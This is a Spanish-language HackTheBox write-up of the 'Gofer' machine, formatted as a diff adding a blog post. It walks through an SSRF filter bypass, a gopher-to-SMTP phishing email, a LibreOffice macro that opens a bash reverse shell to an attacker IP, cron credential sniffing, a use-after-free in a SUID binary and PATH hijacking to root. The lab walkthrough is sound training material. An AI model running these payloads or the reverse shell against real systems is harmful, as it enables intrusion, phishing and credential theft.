@@ -1,0 +1,715 @@
+---
+title: "Máquina Gofer"
+description: "Resolución de la máquina Gofer de HackTheBox"
+categories: ["HackTheBox", "Hard", "Linux"]
+logo: '/assets/writeups/gofer/logo.png'
+tags: ["Apache", "SSRF","Phishing", "Process Spy", "UAF", "$PATH"]
+---
+
+En el sitio web de una empresa hay una persona que suele caer en documentos de Phishing, y un proxy web mal hecho que es aprovechable para forjar peticiones del lado del servidor; usaremos este para enviar un correo de Phising a la persona en cuestión para acceder a la máquina. Escalaremos privilegios tomando credenciales que se filtran al invocar una tarea cron, de un binario SUID vulnerable a Use After Free y hijacking de variables de entorno.
+
+## Reconocimiento
+
+La máquina tiene cuatro puertos abiertos
+
+```bash
+# Nmap 7.94 scan initiated Sat Jul 29 15:01:02 2023 as: nmap -sS -Pn -n -vvv -p- --open -oN ports --min-rate 500 10.129.252.184
+Nmap scan report for 10.129.252.184
+Host is up, received user-set (0.20s latency).
+Scanned at 2023-07-29 15:01:02 -04 for 118s
+Not shown: 64494 closed tcp ports (reset), 1037 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT    STATE SERVICE      REASON
+22/tcp  open  ssh          syn-ack ttl 63
+80/tcp  open  http         syn-ack ttl 63
+139/tcp open  netbios-ssn  syn-ack ttl 63
+445/tcp open  microsoft-ds syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Sat Jul 29 15:03:00 2023 -- 1 IP address (1 host up) scanned in 118.15 seconds
+```
+
+El sitio web no parece tener nada interesante además del portal en cuestión, y el personal del servidor
+
+![Web portal](/assets/writeups/gofer/1.png)
+
+Es un equipo de desarrolladores web que prometen una entrega rápida, segura y bonitos diseños, como muchas. Además de esto el servidor tiene un Samba expuesto
+
+```bash
+139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2
+445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2
+Service Info: Host: gofer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Podemos ver los recursos compartidos como usuario nulo
+
+```bash
+❯ smbclient -U '' -L //gofer.htb
+Password for [WORKGROUP\]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	shares          Disk      
+	IPC$            IPC       IPC Service (Samba 4.13.13-Debian)
+SMB1 disabled -- no workgroup available
+```
+
+En `shares` hay un backup de lo que parece ser un correo...
+
+```bash
+❯ smbclient -U '' //gofer.htb/shares
+Password for [WORKGROUP\]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Fri Oct 28 15:32:08 2022
+  ..                                  D        0  Fri Apr 28 07:59:34 2023
+  .backup                            DH        0  Thu Apr 27 08:49:32 2023
+cd 
+		5061888 blocks of size 1024. 2016352 blocks available
+smb: \> cd .backup
+smb: \.backup\> ls
+  .                                   D        0  Thu Apr 27 08:49:32 2023
+  ..                                  D        0  Fri Oct 28 15:32:08 2022
+  mail                                N     1101  Thu Apr 27 08:49:32 2023
+
+		5061888 blocks of size 1024. 2016352 blocks available
+```
+
+Dice lo siguiente:
+
+> Hello guys,
+> 
+> Our dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. That's why from now on, I've decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an .odt format, as documents saved in Office Word are not always well interpreted by Libreoffice.
+> 
+> PS: Last thing for Tom; I know you're working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seems to me that it should be possible to do so via `<Limit>`
+
+Los headers del correo filtran usuarios del equipo
+
+```bash
+From jdavis@gofer.htb  Fri Oct 28 20:29:30 2022
+Return-Path: <jdavis@gofer.htb>
+X-Original-To: tbuckley@gofer.htb
+Delivered-To: tbuckley@gofer.htb
+... [snip]
+```
+
+Con esto podemos ver como tienen nombrados a sus usuarios en el sistema probablemente, y también tenemos información sobre un proxy web en el que Tom está trabajando y está restringido al publico. Veamos por donde irrumpiremos en el servidor.
+
+## Intrusión
+
+### jhudson - gofer.htb
+
+El proxy web no parece estar en ninguna ruta del servidor Apache, pero si buscamos por subdominios encontramos un `proxy`
+
+```bash
+❯ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.11.225 -H "Host: FUZZ.gofer.htb" -mc all -fw 20
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.225
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.gofer.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+ :: Filter           : Response words: 20
+________________________________________________
+
+proxy                   [Status: 401, Size: 462, Words: 42, Lines: 15, Duration: 139ms]
+```
+
+Nos pide autenticación
+
+```bash
+❯ curl -s http://proxy.gofer.htb
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>401 Unauthorized</title>
+</head><body>
+<h1>Unauthorized</h1>
+<p>This server could not verify that you
+are authorized to access the document
+requested.  Either you supplied the wrong
+credentials (e.g., bad password), or your
+browser doesn't understand how to supply
+the credentials required.</p>
+<hr>
+<address>Apache/2.4.56 (Debian) Server at proxy.gofer.htb Port 80</address>
+</body></html>
+```
+
+Hemos leído que las peticiones estaban siendo bloqueadas por una instrucción `<Limit>` en la configuración de Apache, una cosa que podemos probar siendo esta la instrucción es meterle un método de petición HTTP alternativo para comprobar si solo están filtrando por solo un listado típico de estos o uno solo (GET)
+
+Enviando una petición a una ruta que no parece existir nos devuelve el mismo error de arriba, pero si cambiamos el método de la petición a POST ahora nos devuelve un 404
+
+```bash
+❯ curl -X POST -s http://proxy.gofer.htb/asd
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.56 (Debian) Server at proxy.gofer.htb Port 80</address>
+</body></html>
+```
+
+Buscando archivos típicos que existirían en un servidor web, encontramos un `index.php`
+
+```bash
+❯ curl -X POST -s http://proxy.gofer.htb/index.php
+<!-- Welcome to Gofer proxy -->
+<html><body>Missing URL parameter !</body></html>
+```
+
+Esto tiene una blacklist de strings típicos que se encuentran en un payload SSRF, pero si intentamos representarlo de cierta forma (en decimal) si funciona
+
+```bash
+❯ curl -X POST "http://proxy.gofer.htb/index.php?url=http://127.0.0.1"
+<!-- Welcome to Gofer proxy -->
+<html><body>Blacklisted keyword: /127 !</body></html>                                                                                      
+❯ ip2dec 127.0.0.1
+2130706433
+❯ curl -X POST "http://proxy.gofer.htb/index.php?url=http://2130706433:80/aasdsa"
+<!-- Welcome to Gofer proxy -->
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>400 Bad Request</title>
+... [snip]
+```
+
+Un protocolo típico el cual se suele probar en un SSRF para ver si puedes hacer más cosas fuera de HTTP es [gopher](https://es.wikipedia.org/wiki/Gopher), ya que permite la transmisión de cadenas de texto por TCP sin más a través de la URL, un ejemplo podría ser
+
+`gopher://127.0.0.1/_hola`
+ 
+Especificando el puerto en la URL podremos enviar datos a distintos puertos internos del servidor, como por ejemplo el SSH
+
+```bash
+❯ curl -X POST "http://proxy.gofer.htb/index.php?url=gopher://2130706433:22/asd"
+<!-- Welcome to Gofer proxy -->
+SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1
+Invalid SSH identification string.
+1
+```
+
+En el correo de antes, también leímos que el servidor de correo ahora es interno para que solo el equipo pueda enviar correos y así evitar problemas de Phishing, intentaremos enviar un correo a alguien en el servidor pero tendremos que construir una URL antes de hacer esto...
+
+El protocolo SMTP es plaintext, por lo que podremos enviar comandos al servidor utilizando el `gopher://` pero para que el servidor lo procese debemos terminar cada comando con un newline (`%0A`), también debemos tener en cuenta que se tiene que aplicar un double url-encode a los carácteres que se van a enviar por esta codificación (`%250A`), debido a que esta petición será procesada por un servidor y luego un cliente HTTP. Siguiendo esto el servidor SMTP nos devuelve una respuesta:
+
+```bash
+❯ curl -X POST "http://proxy.gofer.htb/index.php?url=gopher://2130706433:25/_%250AHELO%20gofer.htb%250Aasd%250AQUIT"
+<!-- Welcome to Gofer proxy -->
+220 gofer.htb ESMTP Postfix (Debian/GNU)
+500 5.5.2 Error: bad syntax
+250 gofer.htb
+502 5.5.2 Error: command not recognized
+221 2.0.0 Bye
+1
+```
+
+Conociendo los comandos SMTP podremos construir una serie de comandos para enviarle un correo a alguien; nuestro objetivo será Jacelyn Hudson (jhudson@gofer.htb, intuido por los nombres vistos anteriormente). La URL resultante sería algo así:
+
+```bash
+gopher://2130706433:25/_%250AHELO%20gofer.htb%250AMAIL%20FROM:tbuckley@gofer.htb%250ARCPT%20TO:jhudson@gofer.htb%250ADATA%250ASubject:%20uwu%250AFrom:%20tbuckley@gofer.htb%250ATo:%20jhudson@gofer.htb%250A%250AHi%20from%20hacker%250A%250A.%250AQUIT
+```
+
+Como prueba de interacción, colocaremos un enlace en el correo para ver si esta persona lo pincha, ya que el correo visto anteriormente dice que ella suele caer en intentos de phishing.
+
+```
+gopher://2130706433:25/_%250AHELO%20gofer.htb%250AMAIL%20FROM:tbuckley@gofer.htb%250ARCPT%20TO:jhudson@gofer.htb%250ADATA%250ASubject:%20uwu%250AFrom:%20tbuckley@gofer.htb%250ATo:%20jhudson@gofer.htb%250A%250AHello,%20can%20you%20check%20this?%20http://10.10.14.56:8000/thingy.odt%250A%250A.%250AQUIT
+```
+
+Al enviarlo y esperar un rato, recibimos una petición en el servidor de prueba:
+
+```bash
+❯ curl -X POST "http://proxy.gofer.htb/index.php?url=gopher://2130706433:25/_%250AHELO%20gofer.htb%250AMAIL%20FROM:tbuckley@gofer.htb%250ARCPT%20TO:jhudson@gofer.htb%250ADATA%250ASubject:%20uwu%250AFrom:%20tbuckley@gofer.htb%250ATo:%20jhudson@gofer.htb%250A%250AHello,%20can%20you%20check%20this?%20http://10.10.14.155:8000/thingy.odt%250A%250A.%250AQUIT"
+<!-- Welcome to Gofer proxy -->
+220 gofer.htb ESMTP Postfix (Debian/GNU)
+500 5.5.2 Error: bad syntax
+250 gofer.htb
+250 2.1.0 Ok
+250 2.1.5 Ok
+354 End data with <CR><LF>.<CR><LF>
+250 2.0.0 Ok: queued as 1B493806D
+221 2.0.0 Bye
+1                                                                                     
+❯ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.225 - - [27/Oct/2023 14:32:23] "GET /thingy.odt HTTP/1.1" 200 -
+```
+
+Asumiendo que puede estar intentando descargar un documento LibreOffice ya que estos solo se envian por interno como leímos anteriormente, podemos crearnos uno con el siguiente Macro:
+
+```vb
+Sub Main
+   Shell("bash -c 'bash -i >& /dev/tcp/10.10.14.155/443 0>&1'")
+End Sub
+```
+
+Enviando el enlace con el documento a la persona, esta intenta cargarlo y se ejecuta el Macro que colocamos, haciendo que nos devuelva una reverse shell al servidor
+
+```bash
+❯ nc -nvlp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.225 50180
+bash: cannot set terminal process group (17663): Inappropriate ioctl for device
+bash: no job control in this shell
+bash: /home/jhudson/.bashrc: Permission denied
+jhudson@gofer:/usr/bin$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+jhudson@gofer:/usr/bin$ ^Z
+[1]  + 14031 suspended  nc -nvlp 443
+❯ stty raw -echo; fg
+[1]  + 14031 continued  nc -nvlp 443
+                                    reset xterm
+jhudson@gofer:/usr/bin$ export TERM=xterm-256color
+jhudson@gofer:/usr/bin$ stty rows 34 columns 149
+jhudson@gofer:/usr/bin$
+```
+
+En el directorio de esta usuaria, podremos ver la primera flag
+
+```bash
+jhudson@gofer:~$ ls -la
+total 48
+drwxr-xr-x 7 jhudson jhudson 4096 Oct 27 19:54 .
+drwxr-xr-x 6 root    root    4096 Jul 19 12:44 ..
+lrwxrwxrwx 1 root    root       9 Nov  3  2022 .bash_history -> /dev/null
+-rw-r--r-- 1 jhudson jhudson  220 Oct 28  2022 .bash_logout
+-rw-r--r-- 1 jhudson jhudson 3526 Oct 28  2022 .bashrc
+drwxr-xr-x 4 jhudson jhudson 4096 Jul 19 12:44 .cache
+drwx------ 3 jhudson jhudson 4096 Jul 19 12:44 .config
+drwxrwxrwx 2 jhudson jhudson 4096 Oct 27 19:53 Downloads
+drwx------ 3 jhudson jhudson 4096 Jul 19 12:44 .gnupg
+drwxr-xr-x 3 jhudson jhudson 4096 Oct 27 19:54 .local
+-rw-r--r-- 1 jhudson jhudson  807 Oct 28  2022 .profile
+-rw-r----- 1 root    jhudson   33 Oct 27 06:04 user.txt
+-rw-r--r-- 1 jhudson jhudson   39 Jul 17 16:56 .vimrc
+jhudson@gofer:~$ cat user.txt
+91257017b3b3dbefc97aab59b3******
+```
+
+## Escalada de privilegios
+
+### tbuckley - gofer.htb
+
+No hay nada interesante en el directorio de esta usuaria, asi que husmearemos por los procesos usando `pspy64`.
+
+Luego de un rato mirando, capturamos una credencial en el cmdline de una tarea cron ejecutada por root
+
+```bash
+... [snip]
+2023/10/27 20:36:01 CMD: UID=0     PID=60649  | /usr/sbin/CRON -f 
+2023/10/27 20:36:01 CMD: UID=0     PID=60648  | /usr/sbin/CRON -f 
+2023/10/27 20:36:01 CMD: UID=0     PID=60652  | /usr/bin/curl http://proxy.gofer.htb/?url=http://gofer.htb --user tbuckley:ooP4dietie3o_hquaeti 
+2023/10/27 20:36:02 CMD: UID=0     PID=60651  | /bin/bash /root/scripts/curl.sh 
+2023/10/27 20:36:02 CMD: UID=0     PID=60650  | /bin/sh -c /root/scripts/curl.sh 
+2023/10/27 20:36:02 CMD: UID=0     PID=60653  | /usr/sbin/CRON -f 
+2023/10/27 20:36:02 CMD: UID=0     PID=60654  | /bin/sh -c /root/scripts/mail.sh 
+2023/10/27 20:36:02 CMD: UID=0     PID=60656  | /bin/bash /root/scripts/mail.sh 
+2023/10/27 20:36:02 CMD: UID=0     PID=60657  | /bin/bash /root/scripts/mail.sh 
+2023/10/27 20:36:02 CMD: UID=0     PID=60658  | /bin/bash /root/scripts/mail.sh
+... [snip]
+```
+
+Estas credenciales son válidas e incluso podemos entrar por SSH con ellas.
+
+```bash
+❯ /usr/bin/ssh tbuckley@gofer.htb
+tbuckley@gofer.htbs password: 
+Linux gofer.htb 5.10.0-23-amd64 #1 SMP Debian 5.10.179-2 (2023-07-14) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have no mail.
+tbuckley@gofer:~$ export TERM=xterm-256color
+tbuckley@gofer:~$ bash
+```
+
+### root - gofer.htb
+
+Hay un binario SUID extraño en `/usr/local/bin`
+
+```bash
+tbuckley@gofer:~$ find / -perm -4000 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/libexec/polkit-agent-helper-1
+/usr/bin/fusermount
+/usr/bin/mount
+/usr/bin/passwd
+/usr/bin/umount
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/pkexec
+/usr/bin/su
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/local/bin/notes
+```
+
+Ejecutándolo, parece un simple programa de almacenamiento de notas
+
+```bash
+tbuckley@gofer:~$ /usr/local/bin/notes
+========================================
+1) Create an user and choose an username
+2) Show user information
+3) Delete an user
+4) Write a note
+5) Show a note
+6) Save a note (not yet implemented)
+7) Delete a note
+8) Backup notes
+9) Quit
+========================================
+
+
+Your choice:
+```
+
+Siendo un binario ELF, nos lo traeremos a nuestro equipo para inspeccionarlo. Tiene varios simbolos, pero hay unos de interés:
+
+```bash
+... [snip]
+    50: 0000000000004088     0 NOTYPE  GLOBAL DEFAULT   24 _edata
+    51: 0000000000001534     0 FUNC    GLOBAL HIDDEN    15 _fini
+    52: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getuid@GLIBC_2.2.5
+    53: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND system@GLIBC_2.2.5
+    54: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.2.5
+    55: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memset@GLIBC_2.2.5
+    56: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_mai[...]
+    57: 0000000000004078     0 NOTYPE  GLOBAL DEFAULT   24 __data_start
+    58: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strcmp@GLIBC_2.2.5
+    59: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
+    60: 0000000000004080     0 OBJECT  GLOBAL HIDDEN    24 __dso_handle
+    61: 0000000000002000     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used
+    62: 00000000000014d0    93 FUNC    GLOBAL DEFAULT   14 __libc_csu_init
+    63: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND malloc@GLIBC_2.2.5
+    64: 0000000000004090     0 NOTYPE  GLOBAL DEFAULT   25 _end
+    65: 0000000000001100    43 FUNC    GLOBAL DEFAULT   14 _start
+    66: 0000000000004088     0 NOTYPE  GLOBAL DEFAULT   25 __bss_start
+    67: 00000000000011e5   734 FUNC    GLOBAL DEFAULT   14 main
+    68: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setgid@GLIBC_2.2.5
+    69: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __isoc99_scanf@G[...]
+    70: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.2.5
+... [snip]
+```
+
+Al ver el símbolo de `system` se puede pensar que este programa ejecuta comandos del sistema, viendo los strings lo confirmamos:
+
+```bash
+... [snip]
+Coming soon!
+admin
+Access granted!
+tar -czvf /root/backups/backup_notes.tar.gz /opt/notes
+Access denied: you don't have the admin role!
+... [snip]
+```
+
+Como es un binario SUID y está usando la ruta relativa al programa `tar`, podemos alterar la variable de entorno `PATH` para que valga un directorio que contenga un script con nombre `tar` malicioso y lo ejecute en vez de. El problema es que necesitamos del rol `admin` y cualquier usuario que registremos en este programa solo tendrá el rol `user`
+
+```bash
+Your choice: 1
+
+Choose an username: uwu
+
+========================================
+1) Create an user and choose an username
+2) Show user information
+3) Delete an user
+4) Write a note
+5) Show a note
+6) Save a note (not yet implemented)
+7) Delete a note
+8) Backup notes
+9) Quit
+========================================
+
+
+Your choice: 2
+
+
+Username: uwu
+Role: user
+```
+
+Haciendo un poco de ingenieria inversa, si vemos el pseudo-código C de la función `main`, nos percataremos de algo interesante
+
+```c
+/* r2dec pseudo code output */
+/* notes @ 0x11e5 */
+#include <stdint.h>
+ 
+int32_t main (void) {
+    int64_t var_14h;
+    int64_t var_10h;
+    int64_t var_8h;
+    var_14h = 0;
+    var_8h = 0;
+    var_10h = 0;
+    eax = exit (0);
+    rdx = rax*4;
+    rax = 0x00002228;
+    eax = *((rdx + rax));
+    rax = (int64_t) eax;
+    rdx = 0x00002228;
+    rax += rdx;
+    /* switch table (9 cases) at 0x2228 */
+    void (*rax)() ();
+    rax = malloc (0x28);
+    var_8h = rax;
+    rax = var_8h;
+    memset (rax, 0, 0x18);
+    rax = var_8h;
+    rax += 0x18;
+    memset (rax, 0, 0x10);
+    eax = getuid ();
+    rax = var_8h;
+    rax += 0x18;
+    *(rax) = 0x72657375;
+    void (*0x1204)() ();
+    puts ("========================================\n1) Create an user and choose an username\n2) Show user information\n3) Delete an user\n4) Write a note\n5) Show a note\n6) Save a note (not yet implemented)\n7) Delete a note\n8) Backup notes\n9) Quit\n========================================\n\n");
+    eax = 0;
+    printf ("Your choice: ");
+    rax = &var_14h;
+    rsi = rax;
+    rdi = 0x0000212b;
+    eax = 0;
+    isoc99_scanf ();
+    puts (0x0000212e);
+    eax = var_14h;
+    if (eax > 8) {
+        void (*0x14ad)() ();
+    }
+    rax = var_8h;
+    rax += 0x18;
+    *(rax) = 0x696d6461;
+    *((rax + 4)) = 0x6e;
+    void (*0x12ed)() ();
+    eax = 0;
+    printf ("Choose an username: ");
+    rax = var_8h;
+    rsi = var_8h;
+    rdi = "%23s";
+    eax = 0;
+    isoc99_scanf ();
+    puts (0x0000212e);
+    void (*0x14be)() ();
+    exit (0xffffffff);
+    if (var_8h == 0) {
+        void (*0x1367)() ();
+    }
+    puts ("First create an user!\n");
+    void (*0x14be)() ();
+    rax = var_8h;
+    rsi = var_8h;
+    eax = 0;
+    printf ("\nUsername: %s\n");
+    rax = var_8h;
+    rax += 0x18;
+    rsi = rax;
+    eax = 0;
+    printf ("Role: %s\n\n");
+    void (*0x14be)() ();
+    if (var_8h == 0) {
+        void (*0x14b7)() ();
+    }
+    void (*0x1204)() ();
+    rax = var_8h;
+    free (var_8h);
+    void (*0x14b7)() ();
+    rax = malloc (0x28);
+    var_10h = rax;
+    memset (rax, 0, 0x28);
+    void (*0x13c9)() ();
+    puts ("Write your note:");
+    rax = var_10h;
+    rsi = var_10h;
+    rdi = "%39s";
+    eax = 0;
+    isoc99_scanf ();
+    void (*0x14be)() ();
+    exit (0xffffffff);
+    rax = var_10h;
+    rsi = var_10h;
+    eax = 0;
+    printf ("Note: %s\n\n");
+    void (*0x14be)() ();
+    puts ("Coming soon!\n");
+    void (*0x14be)() ();
+    void (*0x14bd)() ();
+    rax = var_10h;
+    free (var_10h);
+    var_10h = 0;
+    void (*0x14bd)() ();
+    void (*0x149f)() ();
+    puts ("First create an user!\n");
+    void (*0x14be)() ();
+    rax = var_8h;
+    rax += 0x18;
+    eax = strcmp (rax, "admin");
+    void (*0x1491)() ();
+    puts ("Access denied: you don't have the admin role!\n");
+    void (*0x14be)() ();
+    puts ("Access granted!");
+    edi = 0;
+    setuid ();
+    edi = 0;
+    setgid ();
+    system ("tar -czvf /root/backups/backup_notes.tar.gz /opt/notes");
+    return void (*0x14be)() ();
+}
+```
+
+Podemos ver que luego de hacer un `free()` cuando se elimina un usuario, el heap parece quedar apuntando a la misma dirección en la que se escriben las notas en memoria. Se puede apreciar así:
+
+```bash
+Your choice: 2 
+
+
+Username: uwu
+Role: user
+
+========================================
+... [snip]
+========================================
+
+
+Your choice: 3
+
+========================================
+... [snip]
+========================================
+
+
+Your choice: 4
+
+Write your note:
+ASDASDSADASD
+========================================
+... [snip]
+========================================
+
+
+Your choice: 2
+
+
+Username: ASDASDSADASD
+Role: 
+
+```
+
+No sabemos cuantos carácteres tenemos que escribir para llegar a sobrescribir el role, pero probando a adivinar podemos ver que son 24.
+
+```bash
+Your choice: 4
+
+Write your note:
+AAAAAAAAAAAAAAAAAAAAAAAAadmin
+========================================
+1) Create an user and choose an username
+2) Show user information
+3) Delete an user
+4) Write a note
+5) Show a note
+6) Save a note (not yet implemented)
+7) Delete a note
+8) Backup notes
+9) Quit
+========================================
+
+
+Your choice: 2
+
+
+Username: AAAAAAAAAAAAAAAAAAAAAAAAadmin
+Role: admin
+```
+
+Ahora solamente debemos crearnos un script que "disimule" ser el binario de `tar` y agregar su ruta al inicio de PATH, luego ejecutamos el binario, explotamos el UAF para darnos admin y hacer un backup que ejecutará el script `tar`.
+
+```bash
+tbuckley@gofer:/tmp$ cat tar
+#!/bin/bash
+
+bash
+tbuckley@gofer:/tmp$ chmod +x tar
+tbuckley@gofer:/tmp$ export PATH=/tmp:$PATH
+tbuckley@gofer:/tmp$ echo $PATH
+/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+```
+
+Al hacer esto, obtendremos una consola como root y ya podremos tomar la última flag.
+
+```bash
+Your choice: 2
+
+
+Username: AAAAAAAAAAAAAAAAAAAAAAAAadmin
+Role: admin
+
+========================================
+1) Create an user and choose an username
+2) Show user information
+3) Delete an user
+4) Write a note
+5) Show a note
+6) Save a note (not yet implemented)
+7) Delete a note
+8) Backup notes
+9) Quit
+========================================
+
+
+Your choice: 8
+
+Access granted!
+root@gofer:/tmp# cd /root
+root@gofer:/root# ls -la
+total 80
+drwx------ 14 root root 4096 Jul 17 16:55 .
+drwxr-xr-x 18 root root 4096 Jul 19 12:44 ..
+drwxr-xr-x  2 root root 4096 Apr 28  2023 backups
+lrwxrwxrwx  1 root root    9 Nov  3  2022 .bash_history -> /dev/null
+-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
+drwx------  3 root root 4096 Apr 26  2023 .config
+drwxr-xr-x  2 root root 4096 Apr 26  2023 Desktop
+drwxr-xr-x  2 root root 4096 Apr 26  2023 Documents
+drwxr-xr-x  2 root root 4096 Apr 26  2023 Downloads
+drwxr-xr-x  3 root root 4096 Oct 28  2022 .local
+drwxr-xr-x  2 root root 4096 Apr 26  2023 Music
+drwxr-xr-x  2 root root 4096 Apr 26  2023 Pictures
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+drwxr-xr-x  2 root root 4096 Apr 26  2023 Public
+-rw-r-----  1 root root   33 Oct 27 06:04 root.txt
+drwxr-xr-x  2 root root 4096 Jul 27 11:57 scripts
+drwxr-xr-x  2 root root 4096 Apr 26  2023 Templates
+drwxr-xr-x  2 root root 4096 Apr 26  2023 Videos
+-rw-r--r--  1 root root   39 Jul 17 16:55 .vimrc
+-rw-------  1 root root   54 Apr 26  2023 .Xauthority
+-rw-------  1 root root 1626 Apr 27  2023 .xsession-errors
+root@gofer:/root# cat root.txt
+ee31b783c8786faa6fc689161d******
+```
+
+## Extra
+
+La forma intencionada de obtener la credencial de `tbuckley` era capturando el tráfico de red con `tcpdump`, resulta que ejecutar ese proceso con curl igual filtra la credencial en los process monitor en ejecución.
+
+```bash
+root@gofer:/root# /usr/sbin/getcap /usr/bin/tcpdump
+/usr/bin/tcpdump cap_net_admin,cap_net_raw=eip
+```
+
+Una forma de evitar eso, es montando `/proc` con la opción `hidepid` puesta en 1 o 2.
